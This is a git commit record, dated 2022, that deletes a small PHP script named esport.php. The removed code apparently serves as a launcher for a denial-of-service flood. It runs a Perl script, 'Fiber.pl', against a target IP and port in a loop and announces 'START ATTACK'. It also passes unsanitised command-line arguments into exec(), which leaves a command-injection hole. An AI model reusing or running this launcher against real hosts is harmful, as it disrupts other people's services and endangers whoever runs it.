2e8b185677819d11a29d38af479e6ebfe6e7358c
dogter1 <49182050+dogter1@users.noreply.github.com>
2022-07-02 09:32:08 +0700

    Delete esport.php

--- esport.php
+++
@@ -1,7 +0,0 @@
-<?php
-for ($x = 0; $x <= $argv[3]; $x++) {
-	$rand = rand(0,0);
-	exec('/root/perl Fiber.pl '.$argv[1].' '.$argv[2].' 0 '.$rand.' ');
-	echo "START ATTACK BY THEDOG IP ".$argv[1].":".$argv[2]." TIME $x THREADS = $rand\n";
-}
-?>
